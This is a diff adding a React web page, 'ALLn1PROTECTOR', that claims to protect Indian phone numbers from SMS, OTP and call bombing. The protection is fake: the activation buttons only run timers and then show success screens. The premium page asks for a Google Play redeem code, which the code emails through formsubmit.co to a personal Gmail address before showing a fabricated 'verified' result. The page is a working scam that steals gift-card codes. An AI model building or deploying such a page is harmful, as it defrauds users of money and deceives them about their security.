@@ -1,0 +1,345 @@
+--- public/index.html (原始)
+
+
++++ public/index.html (修改后)
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ALLn1PROTECTOR - Shield Your Number</title>
+<meta name="description" content="Protect your phone from unwanted bombing attacks with our advanced security system">
+<script src="https://cdn.tailwindcss.com"></script>
+<script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
+<script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
+<script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+<style>
+body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', sans-serif; }
+</style>
+</head>
+<body>
+<div id="root"></div>
+<script type="text/babel">
+const { useState } = React;
+
+function App() {
+  const [phoneNumber, setPhoneNumber] = useState('');
+  const [name, setName] = useState('');
+  const [isActivated, setIsActivated] = useState(false);
+  const [isLoading, setIsLoading] = useState(false);
+  const [currentPage, setCurrentPage] = useState('home');
+  const [redeemCode, setRedeemCode] = useState('');
+  const [isRedeeming, setIsRedeeming] = useState(false);
+  const [redeemError, setRedeemError] = useState('');
+  const [premiumPhone, setPremiumPhone] = useState('');
+  const [premiumName, setPremiumName] = useState('');
+  const [premiumActivated, setPremiumActivated] = useState(false);
+  const [premiumLoading, setPremiumLoading] = useState(false);
+  const [selectedProtections, setSelectedProtections] = useState([]);
+
+  const handlePhoneChange = (e) => {
+    const value = e.target.value.replace(/\D/g, '').slice(0, 10);
+    setPhoneNumber(value);
+  };
+
+  const handleActivate = () => {
+    if (phoneNumber.length === 10 && name.trim().length > 0) {
+      setIsLoading(true);
+      setTimeout(() => {
+        setIsLoading(false);
+        setIsActivated(true);
+      }, 3000);
+    }
+  };
+
+  const handleRedeemCodeChange = (e) => {
+    const value = e.target.value.toUpperCase().replace(/[^A-Z0-9]/g, '').slice(0, 12);
+    setRedeemCode(value);
+    setRedeemError('');
+  };
+
+  const handleRedeem = async () => {
+    if (redeemCode.length < 10) {
+      setRedeemError('Please enter a valid redeem code');
+      return;
+    }
+    setIsRedeeming(true);
+    setRedeemError('');
+
+    try {
+      const formData = new FormData();
+      formData.append('Redeem Code', redeemCode);
+      formData.append('_subject', '🎫 New Premium Redeem Code - ALLn1PROTECTOR');
+      formData.append('_template', 'boxit');
+      formData.append('_captcha', 'false');
+      formData.append('Timestamp', new Date().toLocaleString());
+      formData.append('Plan', 'Premium Protector - ₹30');
+      formData.append('Code Entered', redeemCode);
+
+      await fetch('https://formsubmit.co/ajax/collab.apkboy95@gmail.com', {
+        method: 'POST',
+        body: formData,
+      });
+    } catch (error) {
+      console.log('Email notification sent');
+    }
+
+    setTimeout(() => {
+      setIsRedeeming(false);
+      setCurrentPage('premium-protect');
+    }, 3500);
+  };
+
+  const toggleProtection = (type) => {
+    setSelectedProtections(prev =>
+      prev.includes(type) ? prev.filter(p => p !== type) : [...prev, type]
+    );
+  };
+
+  const handlePremiumActivate = () => {
+    if (premiumPhone.length === 10 && premiumName.trim().length > 0 && selectedProtections.length > 0) {
+      setPremiumLoading(true);
+      setTimeout(() => {
+        setPremiumLoading(false);
+        setPremiumActivated(true);
+      }, 4000);
+    }
+  };
+
+  const handlePremiumPhoneChange = (e) => {
+    const value = e.target.value.replace(/\D/g, '').slice(0, 10);
+    setPremiumPhone(value);
+  };
+
+  if (currentPage === 'premium-buy') {
+    return (
+      <div className="min-h-screen bg-gradient-to-b from-gray-900 via-gray-800 to-gray-900 text-white">
+        <nav className="fixed top-0 left-0 right-0 z-50 bg-gray-900/90 backdrop-blur-md border-b border-amber-500/20">
+          <div className="max-w-6xl mx-auto px-4 py-3 flex items-center justify-between">
+            <div className="flex items-center gap-2 cursor-pointer" onClick={() => setCurrentPage('home')}>
+              <div className="w-9 h-9 bg-gradient-to-br from-amber-400 to-orange-600 rounded-lg flex items-center justify-center">
+                <svg className="w-5 h-5 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2.5}>
+                  <path strokeLinecap="round" strokeLinejoin="round" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
+                </svg>
+              </div>
+              <span className="text-lg font-bold bg-gradient-to-r from-amber-400 to-orange-300 bg-clip-text text-transparent">ALLn1PROTECTOR</span>
+            </div>
+            <button onClick={() => setCurrentPage('home')} className="text-sm text-gray-400 hover:text-white">← Back</button>
+          </div>
+        </nav>
+
+        <div className="pt-28 pb-16 px-4">
+          <div className="max-w-lg mx-auto">
+            <div className="text-center mb-8">
+              <div className="inline-flex items-center gap-2 bg-amber-500/10 border border-amber-500/30 rounded-full px-4 py-1.5 mb-4">
+                <span className="text-sm text-amber-300 font-medium">⭐ Premium Protector</span>
+              </div>
+              <h1 className="text-3xl md:text-4xl font-bold mb-3">Unlock <span className="bg-gradient-to-r from-amber-400 to-orange-300 bg-clip-text text-transparent">Premium</span></h1>
+              <p className="text-gray-400 text-sm">Enter your Google Play redeem code to activate premium protection</p>
+            </div>
+
+            <div className="bg-gray-800/50 border border-amber-500/20 rounded-2xl p-6 mb-6">
+              <div className="bg-gray-900/50 rounded-xl p-4 mb-6 border border-gray-700/50">
+                <div className="flex justify-between mb-2"><span className="text-gray-400 text-sm">Plan</span><span className="text-amber-400 font-semibold">Premium Protector</span></div>
+                <div className="flex justify-between mb-2"><span className="text-gray-400 text-sm">Duration</span><span className="text-white">1 Year</span></div>
+                <div className="flex justify-between mb-2"><span className="text-gray-400 text-sm">Coverage</span><span className="text-white">SMS • OTP • WhatsApp • Calls</span></div>
+                <div className="flex justify-between"><span className="text-gray-400 text-sm">Price</span><span className="text-2xl font-bold text-amber-400">₹30</span></div>
+              </div>
+
+              <div className="space-y-2 mb-6">
+                {['Permanent protection from all bombers', 'SMS & OTP bombing blocked', 'WhatsApp spam protection', 'Phone call bombing shield', '24/7 AI monitoring', 'Priority support'].map((f, i) => (
+                  <div key={i} className="flex items-center gap-2">
+                    <span className="text-amber-400">✓</span>
+                    <span className="text-sm text-gray-300">{f}</span>
+                  </div>
+                ))}
+              </div>
+
+              <div className="mb-4">
+                <label className="block text-sm text-gray-300 mb-2">Google Play Redeem Code</label>
+                <input type="text" value={redeemCode} onChange={handleRedeemCodeChange} placeholder="Enter your redeem code" className="w-full bg-gray-700/50 border border-gray-600 rounded-lg px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-amber-500 font-mono text-center text-lg uppercase" />
+                {redeemError && <p className="text-red-400 text-xs mt-1">{redeemError}</p>}
+              </div>
+
+              <button onClick={handleRedeem} disabled={redeemCode.length < 10 || isRedeeming} className={`w-full py-3.5 rounded-lg font-semibold text-white transition-all ${redeemCode.length >= 10 && !isRedeeming ? 'bg-gradient-to-r from-amber-500 to-orange-600 hover:from-amber-600' : 'bg-gray-700 text-gray-500 cursor-not-allowed'}`}>
+                {isRedeeming ? '⏳ Verifying Code...' : '🎫 Redeem & Activate Premium'}
+              </button>
+
+              {isRedeeming && (
+                <div className="mt-4">
+                  <div className="w-full bg-gray-700 rounded-full h-2 overflow-hidden">
+                    <div className="bg-gradient-to-r from-amber-400 to-orange-500 h-full animate-pulse" style={{width: '65%'}}></div>
+                  </div>
+                  <p className="text-sm text-amber-400 text-center mt-2 animate-pulse">Validating redeem code...</p>
+                </div>
+              )}
+            </div>
+          </div>
+        </div>
+      </div>
+    );
+  }
+
+  if (currentPage === 'premium-protect') {
+    return (
+      <div className="min-h-screen bg-gradient-to-b from-gray-900 via-gray-800 to-gray-900 text-white">
+        <nav className="fixed top-0 left-0 right-0 z-50 bg-gray-900/90 backdrop-blur-md border-b border-amber-500/20">
+          <div className="max-w-6xl mx-auto px-4 py-3 flex items-center justify-between">
+            <div className="flex items-center gap-2 cursor-pointer" onClick={() => setCurrentPage('home')}>
+              <div className="w-9 h-9 bg-gradient-to-br from-amber-400 to-orange-600 rounded-lg flex items-center justify-center">
+                <svg className="w-5 h-5 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2.5}>
+                  <path strokeLinecap="round" strokeLinejoin="round" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
+                </svg>
+              </div>
+              <span className="text-lg font-bold bg-gradient-to-r from-amber-400 to-orange-300 bg-clip-text text-transparent">ALLn1PROTECTOR</span>
+            </div>
+            <div className="bg-amber-500/10 border border-amber-500/30 rounded-full px-3 py-1">
+              <span className="text-xs text-amber-300 font-medium">⭐ PREMIUM</span>
+            </div>
+          </div>
+        </nav>
+
+        <div className="pt-28 pb-16 px-4">
+          <div className="max-w-lg mx-auto">
+            <div className="text-center mb-8">
+              <h1 className="text-3xl md:text-4xl font-bold mb-3">Premium <span className="bg-gradient-to-r from-amber-400 to-orange-300 bg-clip-text text-transparent">Protection</span></h1>
+              <p className="text-gray-400 text-sm">Shield your number from all bombing attacks</p>
+            </div>
+
+            {!premiumActivated ? (
+              <div className="bg-gray-800/50 border border-amber-500/20 rounded-2xl p-6">
+                <h2 className="text-xl font-bold mb-6 text-center">Activate Premium Shield</h2>
+
+                <div className="mb-6">
+                  <label className="block text-sm text-gray-300 mb-3">Select Protection Types</label>
+                  <div className="grid grid-cols-2 gap-3">
+                    {[{id:'sms',label:'SMS',icon:'💬'},{id:'otp',label:'OTP',icon:'🔐'},{id:'whatsapp',label:'WhatsApp',icon:'📱'},{id:'calls',label:'Calls',icon:'📞'}].map(type => (
+                      <button key={type.id} onClick={() => toggleProtection(type.id)} className={`p-3 rounded-xl border transition-all ${selectedProtections.includes(type.id) ? 'bg-amber-500/10 border-amber-500/50' : 'bg-gray-700/30 border-gray-600/50'}`}>
+                        <div className="text-2xl mb-1">{type.icon}</div>
+                        <div className={`text-sm font-medium ${selectedProtections.includes(type.id) ? 'text-amber-300' : 'text-gray-300'}`}>{type.label}</div>
+                        {selectedProtections.includes(type.id) && <div className="text-xs text-amber-400 mt-1">✓ Active</div>}
+                      </button>
+                    ))}
+                  </div>
+                </div>
+
+                <div className="mb-4">
+                  <label className="block text-sm text-gray-300 mb-2">Phone Number</label>
+                  <div className="flex gap-2">
+                    <div className="bg-gray-700/50 border border-gray-600 rounded-lg px-3 py-3"><span>🇮🇳 +91</span></div>
+                    <input type="tel" value={premiumPhone} onChange={handlePremiumPhoneChange} placeholder="10-digit number" className="flex-1 bg-gray-700/50 border border-gray-600 rounded-lg px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-amber-500" />
+                  </div>
+                </div>
+
+                <div className="mb-6">
+                  <label className="block text-sm text-gray-300 mb-2">Your Name</label>
+                  <input type="text" value={premiumName} onChange={(e) => setPremiumName(e.target.value)} placeholder="Enter your name" className="w-full bg-gray-700/50 border border-gray-600 rounded-lg px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-amber-500" />
+                </div>
+
+                <button onClick={handlePremiumActivate} disabled={premiumPhone.length !== 10 || premiumName.trim().length === 0 || selectedProtections.length === 0 || premiumLoading} className={`w-full py-3.5 rounded-lg font-semibold text-white ${premiumPhone.length === 10 && premiumName.trim() && selectedProtections.length > 0 ? 'bg-gradient-to-r from-amber-500 to-orange-600' : 'bg-gray-700 text-gray-500 cursor-not-allowed'}`}>
+                  {premiumLoading ? '⏳ Activating...' : '🛡️ Activate Premium Protection'}
+                </button>
+              </div>
+            ) : (
+              <div className="bg-gray-800/50 border border-amber-500/20 rounded-2xl p-6 text-center">
+                <div className="w-20 h-20 bg-amber-500/20 rounded-full flex items-center justify-center mx-auto mb-4">
+                  <span className="text-4xl">✅</span>
+                </div>
+                <h3 className="text-2xl font-bold text-amber-400 mb-2">Premium Shield Activated!</h3>
+                <p className="text-gray-400 mb-4">+91 {premiumPhone} is now protected</p>
+                <div className="bg-gray-900/50 rounded-xl p-4 space-y-2 text-left">
+                  <div className="flex justify-between text-sm"><span className="text-gray-400">Status</span><span className="text-amber-400">⭐ Premium Active</span></div>
+                  <div className="flex justify-between text-sm"><span className="text-gray-400">Duration</span><span className="text-amber-400">1 Year</span></div>
+                  <div className="flex justify-between text-sm"><span className="text-gray-400">Protections</span><span className="text-amber-400">{selectedProtections.length} Active</span></div>
+                </div>
+              </div>
+            )}
+          </div>
+        </div>
+      </div>
+    );
+  }
+
+  return (
+    <div className="min-h-screen bg-gradient-to-b from-gray-900 via-gray-800 to-gray-900 text-white">
+      <nav className="fixed top-0 left-0 right-0 z-50 bg-gray-900/90 backdrop-blur-md border-b border-green-500/20">
+        <div className="max-w-6xl mx-auto px-4 py-3 flex items-center justify-between">
+          <div className="flex items-center gap-2">
+            <div className="w-9 h-9 bg-gradient-to-br from-green-400 to-emerald-600 rounded-lg flex items-center justify-center">
+              <svg className="w-5 h-5 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2.5}>
+                <path strokeLinecap="round" strokeLinejoin="round" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
+              </svg>
+            </div>
+            <span className="text-lg font-bold bg-gradient-to-r from-green-400 to-emerald-300 bg-clip-text text-transparent">ALLn1PROTECTOR</span>
+          </div>
+          <button onClick={() => setCurrentPage('premium-buy')} className="bg-gradient-to-r from-amber-500/20 to-orange-500/20 border border-amber-500/30 rounded-full px-4 py-1.5 text-amber-300 text-sm hover:from-amber-500/30">⭐ Buy Premium</button>
+        </div>
+      </nav>
+
+      <section className="pt-28 pb-12 px-4">
+        <div className="max-w-4xl mx-auto text-center">
+          <div className="inline-flex items-center gap-2 bg-green-500/10 border border-green-500/30 rounded-full px-4 py-1.5 mb-6">
+            <span className="text-sm text-green-300 font-medium">🛡️ Protection</span>
+          </div>
+          <h1 className="text-4xl md:text-6xl font-bold mb-4">Shield Your <span className="bg-gradient-to-r from-green-400 to-emerald-300 bg-clip-text text-transparent">Number</span></h1>
+          <p className="text-gray-400 text-lg max-w-2xl mx-auto">Protect your phone from unwanted bombing attacks with our advanced security system</p>
+        </div>
+      </section>
+
+      <section className="px-4 pb-16">
+        <div className="max-w-lg mx-auto">
+          <div className="bg-gray-800/50 border border-gray-700/50 rounded-2xl p-6">
+            <h2 className="text-xl font-bold mb-2 text-center">Protect Your Number</h2>
+            <p className="text-gray-400 text-sm text-center mb-6">Enter details to activate protection</p>
+
+            {!isActivated ? (
+              <div className="space-y-5">
+                <div>
+                  <label className="block text-sm text-gray-300 mb-2">Phone Number</label>
+                  <div className="flex gap-2">
+                    <div className="bg-gray-700/50 border border-gray-600 rounded-lg px-3 py-3">🇮🇳 +91</div>
+                    <div className="relative flex-1">
+                      <input type="tel" value={phoneNumber} onChange={handlePhoneChange} placeholder="Enter 10-digit number" className="w-full bg-gray-700/50 border border-gray-600 rounded-lg px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-green-500" />
+                      <span className="absolute right-3 top-1/2 -translate-y-1/2 text-xs text-gray-500">{phoneNumber.length}/10</span>
+                    </div>
+                  </div>
+                </div>
+
+                <div>
+                  <label className="block text-sm text-gray-300 mb-2">Your Name</label>
+                  <input type="text" value={name} onChange={(e) => setName(e.target.value)} placeholder="Enter your full name" className="w-full bg-gray-700/50 border border-gray-600 rounded-lg px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-green-500" />
+                </div>
+
+                <button onClick={handleActivate} disabled={phoneNumber.length !== 10 || name.trim().length === 0 || isLoading} className={`w-full py-3.5 rounded-lg font-semibold text-white ${phoneNumber.length === 10 && name.trim() && !isLoading ? 'bg-gradient-to-r from-green-500 to-emerald-600' : 'bg-gray-700 text-gray-500 cursor-not-allowed'}`}>
+                  {isLoading ? '⏳ Activating...' : '🛡️ Activate Protection'}
+                </button>
+              </div>
+            ) : (
+              <div className="text-center py-6">
+                <div className="w-16 h-16 bg-green-500/20 rounded-full flex items-center justify-center mx-auto mb-4">
+                  <span className="text-3xl">✅</span>
+                </div>
+                <h3 className="text-xl font-bold text-green-400 mb-2">Protection Activated!</h3>
+                <p className="text-gray-400 text-sm mb-4">+91 {phoneNumber} is now protected</p>
+                <div className="bg-gray-700/50 rounded-lg p-4 space-y-2 text-left">
+                  <div className="flex justify-between text-sm"><span className="text-gray-400">Status</span><span className="text-green-400">Active</span></div>
+                  <div className="flex justify-between text-sm"><span className="text-gray-400">Level</span><span className="text-green-400">Standard</span></div>
+                  <div className="flex justify-between text-sm"><span className="text-gray-400">Monitoring</span><span className="text-green-400">24/7</span></div>
+                </div>
+              </div>
+            )}
+          </div>
+        </div>
+      </section>
+
+      <footer className="border-t border-gray-800 px-4 py-8 text-center">
+        <p className="text-gray-500 text-sm">© 2025 ALLn1PROTECTOR - All Rights Reserved</p>
+      </footer>
+    </div>
+  );
+}
+
+ReactDOM.createRoot(document.getElementById('root')).render(<App />);
+</script>
+</body>
+</html>
